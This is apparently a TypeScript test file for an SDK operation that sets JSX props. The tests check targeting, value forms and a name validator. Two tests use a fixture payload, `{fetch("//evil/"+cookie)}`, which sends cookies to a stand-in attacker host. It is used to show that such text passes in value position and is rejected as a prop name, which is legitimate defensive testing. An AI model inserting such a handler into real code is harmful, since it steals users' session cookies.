/**
 * S-001 — `setJsxProp` (REQ-RXD-04 targeting/upsert, REQ-RXD-11 value forms, REQ-RXD-12
 * trust boundary, REQ-RXD-06.1/.2/.6 validator-adjacent op behaviour). Placement/whitespace
 * scenarios (REQ-RXD-10) live in `dialect.test.ts`; the hostile-name battery and denylist
 * live in `name-validation.test.ts`.
 *
 * Every content assertion pinned as "byte-exact golden" by the signed spec compares against
 * a committed golden (constraint 7); the rest assert the literal expected string directly.
 */
import { describe, it, expect } from "bun:test";
import * as react from "../../../src/dialects/react/index.ts";
import { defineFactory } from "../../../src/core/context.ts";
import { makeSpyClient, collectModifies } from "../../support/spy-client.ts";
import { golden } from "../../support/golden.ts";

const REACT_GOLDEN_DIR = new URL("./golden/", import.meta.url).pathname;

function reactGolden(name: string): string {
  return golden(name, REACT_GOLDEN_DIR);
}

describe("setJsxProp — REQ-RXD-04 targeting trio + upsert", () => {
  it("REQ-RXD-04.1: exactly one match, no existing onClick — the attribute is inserted, rest byte-identical", async () => {
    const { client, emitted } = makeSpyClient({ "Button.tsx": "const el = <Button />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "onClick", "{handleClick}");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    expect(modifies[0]?.modify.content).toBe("const el = <Button onClick={handleClick} />;\n");
  });

  it("REQ-RXD-04.2: exactly one match, existing onClick — the value is replaced, no duplicate attribute", async () => {
    const { client, emitted } = makeSpyClient({ "Button.tsx": "const el = <Button onClick={oldHandler} />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "onClick", "{newHandler}");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    const content = modifies[0]!.modify.content;
    expect(content).toBe("const el = <Button onClick={newHandler} />;\n");
    expect(content.match(/onClick/g)).toHaveLength(1);
  });

  it("REQ-RXD-04.3: a multi-element sample — only the targeted attribute's region differs", async () => {
    const before = 'const a = <Input value="a" />;\nconst b = <Button />;\nconst c = <Input value="c" />;\n';
    const { client, emitted } = makeSpyClient({ "sample.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("sample.tsx").setJsxProp("Button", "onClick", "{f}");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    expect(modifies[0]?.modify.content).toBe(
      'const a = <Input value="a" />;\nconst b = <Button onClick={f} />;\nconst c = <Input value="c" />;\n'
    );
  });

  it("REQ-RXD-04.4: zero matches — rejects naming the missing element and suggesting .modify(), zero directives, file byte-unchanged", async () => {
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Missing", "x", "{1}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect((caught as Error).message).toBe(
      "dialect operation failed: no element named `Missing` was found — use `.modify()` to inspect the file and edit it directly."
    );
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("REQ-RXD-04.5: two matches — rejects naming the element AND the count, never silent first-match, zero directives, byte-unchanged", async () => {
    const before = "const a = <Button />;\nconst b = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "sample.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("sample.tsx").setJsxProp("Button", "onClick", "{f}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect((caught as Error).message).toBe(
      "dialect operation failed: `Button` matched 2 elements — setJsxProp requires exactly one match; use `.modify()` to disambiguate."
    );
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("sample.tsx")).toBe(before);
  });

  it("REQ-RXD-04.6: exactly one <Menu.Item /> — boolean-shorthand insert, byte-exact vs golden", async () => {
    const { client, emitted } = makeSpyClient({ "menu.tsx": "const el = <Menu.Item />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("menu.tsx").setJsxProp("Menu.Item", "disabled");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies[0]?.modify.content).toBe(reactGolden("setprop-boolean-namespaced.txt"));
  });

  it("REQ-RXD-06.6: Menu.Item and my-web-component elementNames are not rejected by the validator — both proceed to targeting", async () => {
    const { client, emitted } = makeSpyClient({
      "a.tsx": "const el = <Menu.Item />;\n",
      "b.tsx": "const el = <my-web-component />;\n",
    });

    const run = defineFactory<void>(async () => {
      await react.find("a.tsx").setJsxProp("Menu.Item", "x", "{1}");
      await react.find("b.tsx").setJsxProp("my-web-component", "x", "{1}");
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(2);
    expect(modifies[0]?.modify.content).toBe("const el = <Menu.Item x={1} />;\n");
    expect(modifies[1]?.modify.content).toBe("const el = <my-web-component x={1} />;\n");
  });
});

describe("setJsxProp — REQ-RXD-11 value forms + REQ-RXD-12 trust boundary", () => {
  it("REQ-RXD-11.1: a quoted string value prints verbatim as the initializer, byte-exact golden", async () => {
    const { client, emitted } = makeSpyClient({ "Input.tsx": "const el = <Input />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "placeholder", '"Search…"');
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(reactGolden("setprop-string-value.txt"));
  });

  it("REQ-RXD-11.2: an expression-container value prints verbatim as the initializer, byte-exact golden", async () => {
    const { client, emitted } = makeSpyClient({ "Input.tsx": "const el = <Input />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "value", "{count}");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(reactGolden("setprop-expression-value.txt"));
  });

  it("REQ-RXD-11.3: no third argument — bare boolean shorthand, no `=`, no initializer", async () => {
    const { client, emitted } = makeSpyClient({ "Input.tsx": "const el = <Input />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "required");
    });
    await run(undefined, { client });

    const content = collectModifies(emitted)[0]!.modify.content;
    expect(content).toBe("const el = <Input required />;\n");
    expect(content).not.toContain("required=");
  });

  it("REQ-RXD-11.4: an existing string-form value is replaced by an expression-form value in place, byte-exact golden", async () => {
    const { client, emitted } = makeSpyClient({ "Input.tsx": 'const el = <Input value="static" />;\n' });

    const run = defineFactory<void>(async () => {
      await react.find("Input.tsx").setJsxProp("Input", "value", "{dynamic}");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(reactGolden("setprop-value-form-replaced.txt"));
  });

  it("REQ-RXD-11.5: a malformed-but-delimiter-balanced value ('{1+}') is emitted verbatim — no output re-validation", async () => {
    // Deviation from the spec's own literal example (see the Deviations section of the
    // apply-progress artefact): `setJsxProp("Button", "data-x", "{")` — a value with an
    // UNTERMINATED delimiter — does not reach this op's "emitted as-is" path at all. Verified
    // directly against ts-morph@28.0.0: `JsxAttributedNode#addAttribute`/`JsxAttribute#
    // setInitializer` reparse-and-reconcile the WHOLE file after every structural edit (this
    // is ts-morph's own architecture, not a choice this SDK makes); an unclosed `{` swallows
    // every token after it into one broken expression, so the reconcile step itself throws
    // "Manipulation error: A syntax error was inserted." BEFORE any text reaches `print()`.
    // The next test pins that this failure is still safely CONTAINED (REQ-DG-05-style), not a
    // leak or a corruption — but it is a reject, not the verbatim-success this scenario names.
    // A value that is malformed (invalid JS) but delimiter-BALANCED — `'{1+}'` — still proves
    // the substance of REQ-RXD-11.5 (the op performs no semantic re-validation of `value`)
    // without hitting ts-morph's reparse ceiling.
    const { client, emitted } = makeSpyClient({ "Button.tsx": "const el = <Button />;\n" });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "data-x", "{1+}");
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe("const el = <Button data-x={1+} />;\n");
  });

  it("REQ-RXD-11.5 (ts-morph boundary pin): a value with an UNTERMINATED delimiter safely rejects — contained, not a silent corruption", async () => {
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "data-x", "{");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toBe('dialect operation failed: setJsxProp() on "Button.tsx" threw');
    expect((caught as Error).cause).toBeUndefined();
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("REQ-RXD-12.1: an injection-shaped payload in VALUE position succeeds and is emitted verbatim (rejection twin: REQ-RXD-06.1)", async () => {
    const { client, emitted } = makeSpyClient({ "Button.tsx": "const el = <Button />;\n" });
    const payload = '{fetch("//evil/"+cookie)}';

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", "onError", payload);
    });
    await run(undefined, { client });

    expect(collectModifies(emitted)[0]?.modify.content).toBe(
      `const el = <Button onError=${payload} />;\n`
    );
  });

  it("REQ-RXD-06.1: the SAME payload in PROPNAME position rejects BEFORE any AST mutation — zero directives, byte-unchanged", async () => {
    const before = "const el = <Button />;\n";
    const { client, emitted } = makeSpyClient({ "Button.tsx": before });
    const hostilePropName = 'onError={fetch("//evil/"+cookie)}';

    const run = defineFactory<void>(async () => {
      await react.find("Button.tsx").setJsxProp("Button", hostilePropName, "{x}");
    });

    let caught: unknown;
    try {
      await run(undefined, { client });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(Error);
    expect((caught as Error).message).toContain("propName");
    expect((caught as Error).message).not.toContain(hostilePropName);
    expect(collectModifies(emitted)).toHaveLength(0);
    expect(await client.read("Button.tsx")).toBe(before);
  });

  it("REQ-RXD-06.2: data-testid, aria-label, and xlink:href each succeed on their own single-match element, byte-exact golden", async () => {
    const before = "const a = <FieldA />;\nconst b = <FieldB />;\nconst c = <FieldC />;\n";
    const { client, emitted } = makeSpyClient({ "fields.tsx": before });

    const run = defineFactory<void>(async () => {
      await react
        .find("fields.tsx")
        .setJsxProp("FieldA", "data-testid", '"a"')
        .setJsxProp("FieldB", "aria-label", '"b"')
        .setJsxProp("FieldC", "xlink:href", '"c"');
    });
    await run(undefined, { client });

    const modifies = collectModifies(emitted);
    expect(modifies).toHaveLength(1);
    expect(modifies[0]?.modify.content).toBe(reactGolden("setprop-widened-propnames.txt"));
  });
});
